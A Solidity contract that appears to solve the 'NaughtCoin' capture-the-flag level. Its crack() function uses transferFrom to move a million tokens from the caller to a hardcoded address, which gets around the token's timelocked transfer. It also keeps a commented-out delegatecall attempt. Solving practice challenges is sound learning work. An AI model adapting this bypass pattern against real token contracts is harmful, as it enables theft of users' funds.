pragma solidity 0.8.4;
import "hardhat/console.sol";

interface NaughtCoin {
    function transfer(address _to, uint256 _value) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external returns (uint256);
}

contract CrackNaughtCoin {
    NaughtCoin private ng;
    address crackAddress;

    constructor(address _crackAddress) {
        crackAddress = _crackAddress;
        ng = NaughtCoin(_crackAddress);
    }

    function crack() external {
        address _to = 0x6606A67b2d0a1f2a01D27f41671D72bAb47a45D8;
        uint256 _amount = 1000000 * 10**18;
        // (bool success, ) = crackAddress.delegatecall(
        //     abi.encodeWithSignature("transfer(address,uint256)", _to, _value)
        // );
        // require(success = true);
        ng.transferFrom(msg.sender, _to, _amount);
    }
}
